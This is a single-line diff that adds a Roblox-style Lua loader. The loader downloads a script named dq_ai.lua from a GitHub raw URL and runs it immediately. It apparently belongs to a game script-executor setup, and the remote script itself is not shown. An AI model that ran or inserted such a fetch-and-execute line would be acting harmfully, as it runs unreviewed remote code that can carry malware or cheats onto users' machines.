@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bigbillygates/releases/main/dq_ai.lua"))()
